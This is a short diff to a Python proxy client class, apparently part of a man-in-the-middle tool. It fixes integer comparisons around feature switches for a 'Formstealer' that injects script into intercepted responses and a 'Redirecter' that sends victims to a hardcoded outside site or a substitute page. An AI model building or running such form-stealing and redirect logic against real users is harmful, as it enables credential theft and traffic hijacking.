@@ -107,11 +107,11 @@ class Client(Thread):
         ####################################
 
         """ ALPHA VERSION ++++++++++++++++++++++++++++ Formstealer ++++++++++++++++++++++++++++ ALPHA VERSION """
-        if self._formstealer is 1:
+        if self._formstealer == 1:
             response = self._js.formStealer(response)
 
         """ ++++++++++++++++++++++++++++ Redirecter - Redirect to Page ++++++++++++++++++++++++++++ """
-        if self._redirectto is 1:
+        if self._redirectto == 1:
             header = self._tools.getHeader(request)
             if "GET " in header:
                 status = self._redirecter.redirectToURL("http://scizoo.lima-city.de/", self._csocket, header)
@@ -120,7 +120,7 @@ class Client(Thread):
                     return
 
         """ ++++++++++++++++++++++++++++ Redirecter - Display own Page ++++++++++++++++++++++++++++ """
-        if self._redirectown is 1:
+        if self._redirectown == 1:
             status = self._redirecter.redirectDislpayOwnPage("Redirecter/testsite1.html", self._csocket)
 
             if status is True:
